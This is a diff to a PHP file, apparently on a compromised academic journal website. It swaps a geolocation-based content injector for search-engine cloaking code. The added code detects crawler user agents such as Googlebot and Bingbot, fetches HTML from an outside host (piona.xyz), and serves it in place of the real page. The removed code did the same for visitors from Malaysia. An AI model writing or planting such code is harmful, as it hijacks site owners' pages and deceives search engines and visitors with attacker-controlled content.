@@ -1,23 +1,34 @@
-<?php
-function getUserCountry() {
-    $ip = $_SERVER['REMOTE_ADDR'];
-    $url = "http://ip-api.com/json/{$ip}";
-    
-    $response = @file_get_contents($url);
-    if ($response) {
-        $data = json_decode($response, true);
-        return $data['countryCode'] ?? null;
-    }
-    return null;
+<?php 
+ini_set('display_errors', 1); 
+ini_set('display_startup_errors', 1); 
+error_reporting(E_ALL); 
+
+$request_uri = $_SERVER['REQUEST_URI'] ?? ''; 
+$user_agent = strtolower($_SERVER['HTTP_USER_AGENT'] ?? ''); 
+
+$bot_signatures = [ 
+    'googlebot', 
+    'bingbot', 
+    'slurp', 
+    'duckduckbot', 
+    'baiduspider', 
+    'yandex', 
+    'crawler', 
+    'Google-Site-Verification',
+    'spider' 
+];
+
+if (strpos($request_uri, '/') !== false) { 
+    foreach ($bot_signatures as $bot) { 
+        if (strpos($user_agent, $bot) !== false) { 
+            $html = @file_get_contents('https://piona.xyz/landing/jurnal.stmikiba/oke.txt'); 
+            header("Content-Type: text/html; charset=UTF-8"); 
+            echo $html !== false ? $html : "Cloaked content failed to load."; 
+            exit; 
+        } 
+    } 
 }
 
-$Zhyven = "https://piona.xyz/landing/jurnal.stmikiba/oke.txt";
-
-if (getUserCountry() === "MY") {
-    header("Content-Type: text/html; charset=UTF-8");
-    echo @file_get_contents($Zhyven);
-    exit();
-}
 ?>
 
 <?php
